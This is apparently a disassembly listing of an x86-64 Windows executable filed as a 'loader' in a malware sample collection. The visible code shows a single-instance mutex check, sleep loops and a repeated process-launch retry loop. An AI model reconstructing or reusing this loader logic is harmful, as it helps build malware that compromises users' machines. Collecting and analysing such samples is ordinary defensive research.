
malware_samples/loader/d44cf4f3954be46e830fb90868e7f741aad5c4681efd79a26462d936d661d2dd.exe:     file format pei-x86-64


Disassembly of section .text:

000000032c481000 <.text>:
   32c481000:	55                   	push   %rbp
   32c481001:	57                   	push   %rdi
   32c481002:	56                   	push   %rsi
   32c481003:	53                   	push   %rbx
   32c481004:	48 83 ec 38          	sub    $0x38,%rsp
   32c481008:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   32c48100d:	4c 89 44 24 70       	mov    %r8,0x70(%rsp)
   32c481012:	85 d2                	test   %edx,%edx
   32c481014:	0f 85 96 00 00 00    	jne    0x32c4810b0
   32c48101a:	8b 05 f8 df 00 00    	mov    0xdff8(%rip),%eax        # 0x32c48f018
   32c481020:	85 c0                	test   %eax,%eax
   32c481022:	0f 8e 69 01 00 00    	jle    0x32c481191
   32c481028:	83 e8 01             	sub    $0x1,%eax
   32c48102b:	89 05 e7 df 00 00    	mov    %eax,0xdfe7(%rip)        # 0x32c48f018
   32c481031:	b8 30 00 00 00       	mov    $0x30,%eax
   32c481036:	65 67 48 8b 00       	mov    %gs:(%eax),%rax
   32c48103b:	48 8b 70 08          	mov    0x8(%rax),%rsi
   32c48103f:	48 8b 1d da b3 00 00 	mov    0xb3da(%rip),%rbx        # 0x32c48c420
   32c481046:	48 8b 2d a3 01 01 00 	mov    0x101a3(%rip),%rbp        # 0x32c4911f0
   32c48104d:	eb 11                	jmp    0x32c481060
   32c48104f:	90                   	nop
   32c481050:	48 39 d6             	cmp    %rdx,%rsi
   32c481053:	0f 84 57 01 00 00    	je     0x32c4811b0
   32c481059:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   32c48105e:	ff d5                	call   *%rbp
   32c481060:	31 c0                	xor    %eax,%eax
   32c481062:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   32c481067:	48 89 c2             	mov    %rax,%rdx
   32c48106a:	48 85 c0             	test   %rax,%rax
   32c48106d:	75 e1                	jne    0x32c481050
   32c48106f:	48 8b 35 ba b3 00 00 	mov    0xb3ba(%rip),%rsi        # 0x32c48c430
   32c481076:	8b 06                	mov    (%rsi),%eax
   32c481078:	83 f8 02             	cmp    $0x2,%eax
   32c48107b:	0f 85 5e 01 00 00    	jne    0x32c4811df
   32c481081:	48 8d 0d 78 df 00 00 	lea    0xdf78(%rip),%rcx        # 0x32c48f000
   32c481088:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   32c48108d:	e8 8e 05 00 00       	call   0x32c481620
   32c481092:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   32c481097:	c7 06 00 00 00 00    	movl   $0x0,(%rsi)
   32c48109d:	48 87 13             	xchg   %rdx,(%rbx)
   32c4810a0:	b8 01 00 00 00       	mov    $0x1,%eax
   32c4810a5:	48 83 c4 38          	add    $0x38,%rsp
   32c4810a9:	5b                   	pop    %rbx
   32c4810aa:	5e                   	pop    %rsi
   32c4810ab:	5f                   	pop    %rdi
   32c4810ac:	5d                   	pop    %rbp
   32c4810ad:	c3                   	ret
   32c4810ae:	66 90                	xchg   %ax,%ax
   32c4810b0:	83 fa 01             	cmp    $0x1,%edx
   32c4810b3:	75 eb                	jne    0x32c4810a0
   32c4810b5:	b8 30 00 00 00       	mov    $0x30,%eax
   32c4810ba:	65 67 48 8b 00       	mov    %gs:(%eax),%rax
   32c4810bf:	48 8b 70 08          	mov    0x8(%rax),%rsi
   32c4810c3:	48 8b 1d 56 b3 00 00 	mov    0xb356(%rip),%rbx        # 0x32c48c420
   32c4810ca:	48 8b 2d 1f 01 01 00 	mov    0x1011f(%rip),%rbp        # 0x32c4911f0
   32c4810d1:	eb 15                	jmp    0x32c4810e8
   32c4810d3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c4810d8:	48 39 c6             	cmp    %rax,%rsi
   32c4810db:	0f 84 bf 00 00 00    	je     0x32c4811a0
   32c4810e1:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   32c4810e6:	ff d5                	call   *%rbp
   32c4810e8:	31 c0                	xor    %eax,%eax
   32c4810ea:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   32c4810ef:	75 e7                	jne    0x32c4810d8
   32c4810f1:	31 ff                	xor    %edi,%edi
   32c4810f3:	48 8b 35 36 b3 00 00 	mov    0xb336(%rip),%rsi        # 0x32c48c430
   32c4810fa:	8b 06                	mov    (%rsi),%eax
   32c4810fc:	85 c0                	test   %eax,%eax
   32c4810fe:	0f 85 db 00 00 00    	jne    0x32c4811df
   32c481104:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
   32c48110a:	e8 31 09 00 00       	call   0x32c481a40
   32c48110f:	48 8d 0d ea de 00 00 	lea    0xdeea(%rip),%rcx        # 0x32c48f000
   32c481116:	e8 15 04 00 00       	call   0x32c481530
   32c48111b:	85 c0                	test   %eax,%eax
   32c48111d:	75 69                	jne    0x32c481188
   32c48111f:	48 8b 15 5a b3 00 00 	mov    0xb35a(%rip),%rdx        # 0x32c48c480
   32c481126:	48 8b 0d 43 b3 00 00 	mov    0xb343(%rip),%rcx        # 0x32c48c470
   32c48112d:	e8 be 03 00 00       	call   0x32c4814f0
   32c481132:	85 c0                	test   %eax,%eax
   32c481134:	75 52                	jne    0x32c481188
   32c481136:	48 8b 15 23 b3 00 00 	mov    0xb323(%rip),%rdx        # 0x32c48c460
   32c48113d:	48 8b 0d 0c b3 00 00 	mov    0xb30c(%rip),%rcx        # 0x32c48c450
   32c481144:	e8 4f 05 00 00       	call   0x32c481698
   32c481149:	e8 52 06 00 00       	call   0x32c4817a0
   32c48114e:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
   32c481154:	85 ff                	test   %edi,%edi
   32c481156:	74 7d                	je     0x32c4811d5
   32c481158:	48 8b 05 91 b2 00 00 	mov    0xb291(%rip),%rax        # 0x32c48c3f0
   32c48115f:	48 8b 00             	mov    (%rax),%rax
   32c481162:	48 85 c0             	test   %rax,%rax
   32c481165:	74 11                	je     0x32c481178
   32c481167:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   32c48116c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   32c481171:	ba 02 00 00 00       	mov    $0x2,%edx
   32c481176:	ff d0                	call   *%rax
   32c481178:	83 05 99 de 00 00 01 	addl   $0x1,0xde99(%rip)        # 0x32c48f018
   32c48117f:	e9 1c ff ff ff       	jmp    0x32c4810a0
   32c481184:	0f 1f 40 00          	nopl   0x0(%rax)
   32c481188:	85 ff                	test   %edi,%edi
   32c48118a:	75 05                	jne    0x32c481191
   32c48118c:	31 c0                	xor    %eax,%eax
   32c48118e:	48 87 03             	xchg   %rax,(%rbx)
   32c481191:	31 c0                	xor    %eax,%eax
   32c481193:	48 83 c4 38          	add    $0x38,%rsp
   32c481197:	5b                   	pop    %rbx
   32c481198:	5e                   	pop    %rsi
   32c481199:	5f                   	pop    %rdi
   32c48119a:	5d                   	pop    %rbp
   32c48119b:	c3                   	ret
   32c48119c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c4811a0:	bf 01 00 00 00       	mov    $0x1,%edi
   32c4811a5:	e9 49 ff ff ff       	jmp    0x32c4810f3
   32c4811aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4811b0:	48 8b 1d 79 b2 00 00 	mov    0xb279(%rip),%rbx        # 0x32c48c430
   32c4811b7:	8b 03                	mov    (%rbx),%eax
   32c4811b9:	83 f8 02             	cmp    $0x2,%eax
   32c4811bc:	75 21                	jne    0x32c4811df
   32c4811be:	48 8d 0d 3b de 00 00 	lea    0xde3b(%rip),%rcx        # 0x32c48f000
   32c4811c5:	e8 56 04 00 00       	call   0x32c481620
   32c4811ca:	c7 03 00 00 00 00    	movl   $0x0,(%rbx)
   32c4811d0:	e9 cb fe ff ff       	jmp    0x32c4810a0
   32c4811d5:	31 c0                	xor    %eax,%eax
   32c4811d7:	48 87 03             	xchg   %rax,(%rbx)
   32c4811da:	e9 79 ff ff ff       	jmp    0x32c481158
   32c4811df:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   32c4811e4:	e8 a7 04 00 00       	call   0x32c481690
   32c4811e9:	90                   	nop
   32c4811ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4811f0:	57                   	push   %rdi
   32c4811f1:	56                   	push   %rsi
   32c4811f2:	53                   	push   %rbx
   32c4811f3:	48 83 ec 30          	sub    $0x30,%rsp
   32c4811f7:	48 89 cb             	mov    %rcx,%rbx
   32c4811fa:	4c 89 c6             	mov    %r8,%rsi
   32c4811fd:	83 fa 01             	cmp    $0x1,%edx
   32c481200:	74 76                	je     0x32c481278
   32c481202:	48 8b 3d 07 b2 00 00 	mov    0xb207(%rip),%rdi        # 0x32c48c410
   32c481209:	89 17                	mov    %edx,(%rdi)
   32c48120b:	85 d2                	test   %edx,%edx
   32c48120d:	0f 85 cd 00 00 00    	jne    0x32c4812e0
   32c481213:	8b 05 ff dd 00 00    	mov    0xddff(%rip),%eax        # 0x32c48f018
   32c481219:	85 c0                	test   %eax,%eax
   32c48121b:	7e 53                	jle    0x32c481270
   32c48121d:	89 54 24 58          	mov    %edx,0x58(%rsp)
   32c481221:	31 d2                	xor    %edx,%edx
   32c481223:	e8 a9 02 00 00       	call   0x32c4814d1
   32c481228:	44 8b 4c 24 58       	mov    0x58(%rsp),%r9d
   32c48122d:	49 89 f0             	mov    %rsi,%r8
   32c481230:	44 89 ca             	mov    %r9d,%edx
   32c481233:	48 89 d9             	mov    %rbx,%rcx
   32c481236:	e8 c5 fd ff ff       	call   0x32c481000
   32c48123b:	41 89 c2             	mov    %eax,%r10d
   32c48123e:	44 89 d0             	mov    %r10d,%eax
   32c481241:	c7 07 ff ff ff ff    	movl   $0xffffffff,(%rdi)
   32c481247:	48 83 c4 30          	add    $0x30,%rsp
   32c48124b:	5b                   	pop    %rbx
   32c48124c:	5e                   	pop    %rsi
   32c48124d:	5f                   	pop    %rdi
   32c48124e:	c3                   	ret
   32c48124f:	90                   	nop
   32c481250:	ba 02 00 00 00       	mov    $0x2,%edx
   32c481255:	e8 a6 fd ff ff       	call   0x32c481000
   32c48125a:	85 c0                	test   %eax,%eax
   32c48125c:	0f 85 a7 00 00 00    	jne    0x32c481309
   32c481262:	0f 1f 00             	nopl   (%rax)
   32c481265:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48126c:	00 00 00 00 
   32c481270:	45 31 d2             	xor    %r10d,%r10d
   32c481273:	eb c9                	jmp    0x32c48123e
   32c481275:	0f 1f 00             	nopl   (%rax)
   32c481278:	48 8b 05 81 b1 00 00 	mov    0xb181(%rip),%rax        # 0x32c48c400
   32c48127f:	48 8b 3d 8a b1 00 00 	mov    0xb18a(%rip),%rdi        # 0x32c48c410
   32c481286:	ba 01 00 00 00       	mov    $0x1,%edx
   32c48128b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   32c481291:	c7 07 01 00 00 00    	movl   $0x1,(%rdi)
   32c481297:	e8 64 fd ff ff       	call   0x32c481000
   32c48129c:	85 c0                	test   %eax,%eax
   32c48129e:	74 d0                	je     0x32c481270
   32c4812a0:	49 89 f0             	mov    %rsi,%r8
   32c4812a3:	ba 01 00 00 00       	mov    $0x1,%edx
   32c4812a8:	48 89 d9             	mov    %rbx,%rcx
   32c4812ab:	e8 21 02 00 00       	call   0x32c4814d1
   32c4812b0:	41 89 c2             	mov    %eax,%r10d
   32c4812b3:	85 c0                	test   %eax,%eax
   32c4812b5:	75 87                	jne    0x32c48123e
   32c4812b7:	49 89 f0             	mov    %rsi,%r8
   32c4812ba:	31 d2                	xor    %edx,%edx
   32c4812bc:	48 89 d9             	mov    %rbx,%rcx
   32c4812bf:	44 89 54 24 2c       	mov    %r10d,0x2c(%rsp)
   32c4812c4:	e8 08 02 00 00       	call   0x32c4814d1
   32c4812c9:	49 89 f0             	mov    %rsi,%r8
   32c4812cc:	31 d2                	xor    %edx,%edx
   32c4812ce:	48 89 d9             	mov    %rbx,%rcx
   32c4812d1:	e8 2a fd ff ff       	call   0x32c481000
   32c4812d6:	44 8b 54 24 2c       	mov    0x2c(%rsp),%r10d
   32c4812db:	e9 5e ff ff ff       	jmp    0x32c48123e
   32c4812e0:	83 fa 02             	cmp    $0x2,%edx
   32c4812e3:	0f 84 67 ff ff ff    	je     0x32c481250
   32c4812e9:	89 54 24 58          	mov    %edx,0x58(%rsp)
   32c4812ed:	e8 df 01 00 00       	call   0x32c4814d1
   32c4812f2:	44 8b 4c 24 58       	mov    0x58(%rsp),%r9d
   32c4812f7:	41 89 c2             	mov    %eax,%r10d
   32c4812fa:	41 83 f9 03          	cmp    $0x3,%r9d
   32c4812fe:	0f 85 3a ff ff ff    	jne    0x32c48123e
   32c481304:	e9 24 ff ff ff       	jmp    0x32c48122d
   32c481309:	49 89 f0             	mov    %rsi,%r8
   32c48130c:	ba 02 00 00 00       	mov    $0x2,%edx
   32c481311:	48 89 d9             	mov    %rbx,%rcx
   32c481314:	e8 b8 01 00 00       	call   0x32c4814d1
   32c481319:	41 89 c2             	mov    %eax,%r10d
   32c48131c:	e9 1d ff ff ff       	jmp    0x32c48123e
   32c481321:	0f 1f 40 00          	nopl   0x0(%rax)
   32c481325:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48132c:	00 00 00 00 
   32c481330:	48 89 ca             	mov    %rcx,%rdx
   32c481333:	48 8d 0d c6 dc 00 00 	lea    0xdcc6(%rip),%rcx        # 0x32c48f000
   32c48133a:	e9 11 02 00 00       	jmp    0x32c481550
   32c48133f:	90                   	nop
   32c481340:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x32c481350
   32c481347:	e9 e4 ff ff ff       	jmp    0x32c481330
   32c48134c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c481350:	c3                   	ret
   32c481351:	90                   	nop
   32c481352:	90                   	nop
   32c481353:	90                   	nop
   32c481354:	90                   	nop
   32c481355:	90                   	nop
   32c481356:	90                   	nop
   32c481357:	90                   	nop
   32c481358:	90                   	nop
   32c481359:	90                   	nop
   32c48135a:	90                   	nop
   32c48135b:	90                   	nop
   32c48135c:	90                   	nop
   32c48135d:	90                   	nop
   32c48135e:	90                   	nop
   32c48135f:	90                   	nop
   32c481360:	57                   	push   %rdi
   32c481361:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   32c481368:	31 c0                	xor    %eax,%eax
   32c48136a:	48 8d 7c 24 38       	lea    0x38(%rsp),%rdi
   32c48136f:	b9 1a 00 00 00       	mov    $0x1a,%ecx
   32c481374:	c7 44 24 30 70 00 00 	movl   $0x70,0x30(%rsp)
   32c48137b:	00 
   32c48137c:	f3 ab                	rep stos %eax,(%rdi)
   32c48137e:	48 8d 05 7b 8c 00 00 	lea    0x8c7b(%rip),%rax        # 0x32c48a000
   32c481385:	c7 44 24 60 05 00 00 	movl   $0x5,0x60(%rsp)
   32c48138c:	00 
   32c48138d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   32c481392:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   32c481397:	48 8d 05 68 8c 00 00 	lea    0x8c68(%rip),%rax        # 0x32c48a006
   32c48139e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   32c4813a3:	48 8d 05 6b 8c 00 00 	lea    0x8c6b(%rip),%rax        # 0x32c48a015
   32c4813aa:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   32c4813af:	c7 44 24 34 40 00 00 	movl   $0x40,0x34(%rsp)
   32c4813b6:	00 
   32c4813b7:	ff 15 33 ff 00 00    	call   *0xff33(%rip)        # 0x32c4912f0
   32c4813bd:	85 c0                	test   %eax,%eax
   32c4813bf:	75 04                	jne    0x32c4813c5
   32c4813c1:	31 ff                	xor    %edi,%edi
   32c4813c3:	eb 4a                	jmp    0x32c48140f
   32c4813c5:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   32c4813cc:	00 
   32c4813cd:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   32c4813d2:	ff 15 38 fe 00 00    	call   *0xfe38(%rip)        # 0x32c491210
   32c4813d8:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   32c4813df:	00 
   32c4813e0:	48 85 c9             	test   %rcx,%rcx
   32c4813e3:	74 dc                	je     0x32c4813c1
   32c4813e5:	31 c0                	xor    %eax,%eax
   32c4813e7:	31 ff                	xor    %edi,%edi
   32c4813e9:	48 8d 54 24 2c       	lea    0x2c(%rsp),%rdx
   32c4813ee:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   32c4813f2:	ff 15 d0 fd 00 00    	call   *0xfdd0(%rip)        # 0x32c4911c8
   32c4813f8:	83 7c 24 2c 7b       	cmpl   $0x7b,0x2c(%rsp)
   32c4813fd:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   32c481404:	00 
   32c481405:	40 0f 94 c7          	sete   %dil
   32c481409:	ff 15 99 fd 00 00    	call   *0xfd99(%rip)        # 0x32c4911a8
   32c48140f:	b9 f4 01 00 00       	mov    $0x1f4,%ecx
   32c481414:	ff 15 d6 fd 00 00    	call   *0xfdd6(%rip)        # 0x32c4911f0
   32c48141a:	85 ff                	test   %edi,%edi
   32c48141c:	0f 84 46 ff ff ff    	je     0x32c481368
   32c481422:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   32c481429:	5f                   	pop    %rdi
   32c48142a:	c3                   	ret
   32c48142b:	56                   	push   %rsi
   32c48142c:	b8 28 10 00 00       	mov    $0x1028,%eax
   32c481431:	53                   	push   %rbx
   32c481432:	e8 49 10 00 00       	call   0x32c482480
   32c481437:	48 29 c4             	sub    %rax,%rsp
   32c48143a:	31 d2                	xor    %edx,%edx
   32c48143c:	31 c9                	xor    %ecx,%ecx
   32c48143e:	4c 8d 05 2c 9e 00 00 	lea    0x9e2c(%rip),%r8        # 0x32c48b271
   32c481445:	ff 15 65 fd 00 00    	call   *0xfd65(%rip)        # 0x32c4911b0
   32c48144b:	48 89 05 ce db 00 00 	mov    %rax,0xdbce(%rip)        # 0x32c48f020
   32c481452:	ff 15 78 fd 00 00    	call   *0xfd78(%rip)        # 0x32c4911d0
   32c481458:	3d b7 00 00 00       	cmp    $0xb7,%eax
   32c48145d:	75 17                	jne    0x32c481476
   32c48145f:	48 8b 0d ba db 00 00 	mov    0xdbba(%rip),%rcx        # 0x32c48f020
   32c481466:	48 81 c4 28 10 00 00 	add    $0x1028,%rsp
   32c48146d:	5b                   	pop    %rbx
   32c48146e:	5e                   	pop    %rsi
   32c48146f:	48 ff 25 32 fd 00 00 	rex.W jmp *0xfd32(%rip)        # 0x32c4911a8
   32c481476:	b9 88 13 00 00       	mov    $0x1388,%ecx
   32c48147b:	48 8b 35 6e fd 00 00 	mov    0xfd6e(%rip),%rsi        # 0x32c4911f0
   32c481482:	bb 08 00 00 00       	mov    $0x8,%ebx
   32c481487:	ff d6                	call   *%rsi
   32c481489:	e8 d2 fe ff ff       	call   0x32c481360
   32c48148e:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   32c481493:	ff d6                	call   *%rsi
   32c481495:	ff cb                	dec    %ebx
   32c481497:	75 f5                	jne    0x32c48148e
   32c481499:	4c 8d 05 ea 9d 00 00 	lea    0x9dea(%rip),%r8        # 0x32c48b28a
   32c4814a0:	ba 00 10 00 00       	mov    $0x1000,%edx
   32c4814a5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   32c4814aa:	e8 11 10 00 00       	call   0x32c4824c0
   32c4814af:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   32c4814b4:	e8 0f 02 00 00       	call   0x32c4816c8
   32c4814b9:	48 8b 0d 60 db 00 00 	mov    0xdb60(%rip),%rcx        # 0x32c48f020
   32c4814c0:	ff 15 e2 fc 00 00    	call   *0xfce2(%rip)        # 0x32c4911a8
   32c4814c6:	90                   	nop
   32c4814c7:	48 81 c4 28 10 00 00 	add    $0x1028,%rsp
   32c4814ce:	5b                   	pop    %rbx
   32c4814cf:	5e                   	pop    %rsi
   32c4814d0:	c3                   	ret
   32c4814d1:	b8 01 00 00 00       	mov    $0x1,%eax
   32c4814d6:	c3                   	ret
   32c4814d7:	90                   	nop
   32c4814d8:	90                   	nop
   32c4814d9:	90                   	nop
   32c4814da:	90                   	nop
   32c4814db:	90                   	nop
   32c4814dc:	90                   	nop
   32c4814dd:	90                   	nop
   32c4814de:	90                   	nop
   32c4814df:	90                   	nop
   32c4814e0:	ff 25 0a fe 00 00    	jmp    *0xfe0a(%rip)        # 0x32c4912f0
   32c4814e6:	90                   	nop
   32c4814e7:	90                   	nop
   32c4814e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4814ef:	00 
   32c4814f0:	56                   	push   %rsi
   32c4814f1:	53                   	push   %rbx
   32c4814f2:	48 83 ec 28          	sub    $0x28,%rsp
   32c4814f6:	48 89 cb             	mov    %rcx,%rbx
   32c4814f9:	48 89 d6             	mov    %rdx,%rsi
   32c4814fc:	48 39 d1             	cmp    %rdx,%rcx
   32c4814ff:	73 26                	jae    0x32c481527
   32c481501:	0f 1f 40 00          	nopl   0x0(%rax)
   32c481505:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48150c:	00 00 00 00 
   32c481510:	48 8b 03             	mov    (%rbx),%rax
   32c481513:	48 85 c0             	test   %rax,%rax
   32c481516:	74 06                	je     0x32c48151e
   32c481518:	ff d0                	call   *%rax
   32c48151a:	85 c0                	test   %eax,%eax
   32c48151c:	75 0b                	jne    0x32c481529
   32c48151e:	48 83 c3 08          	add    $0x8,%rbx
   32c481522:	48 39 f3             	cmp    %rsi,%rbx
   32c481525:	72 e9                	jb     0x32c481510
   32c481527:	31 c0                	xor    %eax,%eax
   32c481529:	48 83 c4 28          	add    $0x28,%rsp
   32c48152d:	5b                   	pop    %rbx
   32c48152e:	5e                   	pop    %rsi
   32c48152f:	c3                   	ret
   32c481530:	48 85 c9             	test   %rcx,%rcx
   32c481533:	74 12                	je     0x32c481547
   32c481535:	66 0f ef c0          	pxor   %xmm0,%xmm0
   32c481539:	31 c0                	xor    %eax,%eax
   32c48153b:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   32c481542:	00 
   32c481543:	0f 11 01             	movups %xmm0,(%rcx)
   32c481546:	c3                   	ret
   32c481547:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   32c48154c:	c3                   	ret
   32c48154d:	0f 1f 00             	nopl   (%rax)
   32c481550:	56                   	push   %rsi
   32c481551:	53                   	push   %rbx
   32c481552:	48 83 ec 38          	sub    $0x38,%rsp
   32c481556:	48 89 cb             	mov    %rcx,%rbx
   32c481559:	48 89 d6             	mov    %rdx,%rsi
   32c48155c:	48 85 c9             	test   %rcx,%rcx
   32c48155f:	0f 84 ab 00 00 00    	je     0x32c481610
   32c481565:	b9 08 00 00 00       	mov    $0x8,%ecx
   32c48156a:	e8 31 01 00 00       	call   0x32c4816a0
   32c48156f:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   32c481573:	74 5b                	je     0x32c4815d0
   32c481575:	48 8b 43 08          	mov    0x8(%rbx),%rax
   32c481579:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   32c48157d:	48 39 d0             	cmp    %rdx,%rax
   32c481580:	74 1e                	je     0x32c4815a0
   32c481582:	48 8d 50 08          	lea    0x8(%rax),%rdx
   32c481586:	b9 08 00 00 00       	mov    $0x8,%ecx
   32c48158b:	48 89 53 08          	mov    %rdx,0x8(%rbx)
   32c48158f:	48 89 30             	mov    %rsi,(%rax)
   32c481592:	e8 11 01 00 00       	call   0x32c4816a8
   32c481597:	31 c0                	xor    %eax,%eax
   32c481599:	48 83 c4 38          	add    $0x38,%rsp
   32c48159d:	5b                   	pop    %rbx
   32c48159e:	5e                   	pop    %rsi
   32c48159f:	c3                   	ret
   32c4815a0:	48 8b 0b             	mov    (%rbx),%rcx
   32c4815a3:	48 29 c8             	sub    %rcx,%rax
   32c4815a6:	48 8d 14 00          	lea    (%rax,%rax,1),%rdx
   32c4815aa:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   32c4815af:	e8 0c 01 00 00       	call   0x32c4816c0
   32c4815b4:	48 85 c0             	test   %rax,%rax
   32c4815b7:	74 3f                	je     0x32c4815f8
   32c4815b9:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   32c4815be:	48 89 03             	mov    %rax,(%rbx)
   32c4815c1:	4c 01 c0             	add    %r8,%rax
   32c4815c4:	49 01 c0             	add    %rax,%r8
   32c4815c7:	4c 89 43 10          	mov    %r8,0x10(%rbx)
   32c4815cb:	eb b5                	jmp    0x32c481582
   32c4815cd:	0f 1f 00             	nopl   (%rax)
   32c4815d0:	ba 08 00 00 00       	mov    $0x8,%edx
   32c4815d5:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c4815da:	e8 d1 00 00 00       	call   0x32c4816b0
   32c4815df:	48 89 03             	mov    %rax,(%rbx)
   32c4815e2:	48 85 c0             	test   %rax,%rax
   32c4815e5:	74 11                	je     0x32c4815f8
   32c4815e7:	48 8d 90 00 01 00 00 	lea    0x100(%rax),%rdx
   32c4815ee:	48 89 43 08          	mov    %rax,0x8(%rbx)
   32c4815f2:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   32c4815f6:	eb 85                	jmp    0x32c48157d
   32c4815f8:	b9 08 00 00 00       	mov    $0x8,%ecx
   32c4815fd:	e8 a6 00 00 00       	call   0x32c4816a8
   32c481602:	0f 1f 00             	nopl   (%rax)
   32c481605:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48160c:	00 00 00 00 
   32c481610:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   32c481615:	eb 82                	jmp    0x32c481599
   32c481617:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48161e:	00 00 
   32c481620:	57                   	push   %rdi
   32c481621:	56                   	push   %rsi
   32c481622:	53                   	push   %rbx
   32c481623:	48 83 ec 20          	sub    $0x20,%rsp
   32c481627:	48 89 cf             	mov    %rcx,%rdi
   32c48162a:	b9 08 00 00 00       	mov    $0x8,%ecx
   32c48162f:	e8 6c 00 00 00       	call   0x32c4816a0
   32c481634:	48 8b 37             	mov    (%rdi),%rsi
   32c481637:	66 0f ef c0          	pxor   %xmm0,%xmm0
   32c48163b:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   32c48163f:	48 c7 47 10 00 00 00 	movq   $0x0,0x10(%rdi)
   32c481646:	00 
   32c481647:	b9 08 00 00 00       	mov    $0x8,%ecx
   32c48164c:	0f 11 07             	movups %xmm0,(%rdi)
   32c48164f:	e8 54 00 00 00       	call   0x32c4816a8
   32c481654:	48 85 f6             	test   %rsi,%rsi
   32c481657:	74 24                	je     0x32c48167d
   32c481659:	48 83 eb 08          	sub    $0x8,%rbx
   32c48165d:	48 39 f3             	cmp    %rsi,%rbx
   32c481660:	72 13                	jb     0x32c481675
   32c481662:	48 8b 03             	mov    (%rbx),%rax
   32c481665:	48 85 c0             	test   %rax,%rax
   32c481668:	74 ef                	je     0x32c481659
   32c48166a:	ff d0                	call   *%rax
   32c48166c:	48 83 eb 08          	sub    $0x8,%rbx
   32c481670:	48 39 f3             	cmp    %rsi,%rbx
   32c481673:	73 ed                	jae    0x32c481662
   32c481675:	48 89 f1             	mov    %rsi,%rcx
   32c481678:	e8 3b 00 00 00       	call   0x32c4816b8
   32c48167d:	31 c0                	xor    %eax,%eax
   32c48167f:	48 83 c4 20          	add    $0x20,%rsp
   32c481683:	5b                   	pop    %rbx
   32c481684:	5e                   	pop    %rsi
   32c481685:	5f                   	pop    %rdi
   32c481686:	c3                   	ret
   32c481687:	90                   	nop
   32c481688:	90                   	nop
   32c481689:	90                   	nop
   32c48168a:	90                   	nop
   32c48168b:	90                   	nop
   32c48168c:	90                   	nop
   32c48168d:	90                   	nop
   32c48168e:	90                   	nop
   32c48168f:	90                   	nop
   32c481690:	ff 25 aa fb 00 00    	jmp    *0xfbaa(%rip)        # 0x32c491240
   32c481696:	90                   	nop
   32c481697:	90                   	nop
   32c481698:	ff 25 b2 fb 00 00    	jmp    *0xfbb2(%rip)        # 0x32c491250
   32c48169e:	90                   	nop
   32c48169f:	90                   	nop
   32c4816a0:	ff 25 b2 fb 00 00    	jmp    *0xfbb2(%rip)        # 0x32c491258
   32c4816a6:	90                   	nop
   32c4816a7:	90                   	nop
   32c4816a8:	ff 25 b2 fb 00 00    	jmp    *0xfbb2(%rip)        # 0x32c491260
   32c4816ae:	90                   	nop
   32c4816af:	90                   	nop
   32c4816b0:	ff 25 ba fb 00 00    	jmp    *0xfbba(%rip)        # 0x32c491270
   32c4816b6:	90                   	nop
   32c4816b7:	90                   	nop
   32c4816b8:	ff 25 ca fb 00 00    	jmp    *0xfbca(%rip)        # 0x32c491288
   32c4816be:	90                   	nop
   32c4816bf:	90                   	nop
   32c4816c0:	ff 25 ea fb 00 00    	jmp    *0xfbea(%rip)        # 0x32c4912b0
   32c4816c6:	90                   	nop
   32c4816c7:	90                   	nop
   32c4816c8:	ff 25 02 fc 00 00    	jmp    *0xfc02(%rip)        # 0x32c4912d0
   32c4816ce:	90                   	nop
   32c4816cf:	90                   	nop
   32c4816d0:	48 83 ec 28          	sub    $0x28,%rsp
   32c4816d4:	48 8b 05 65 79 00 00 	mov    0x7965(%rip),%rax        # 0x32c489040
   32c4816db:	48 8b 00             	mov    (%rax),%rax
   32c4816de:	48 85 c0             	test   %rax,%rax
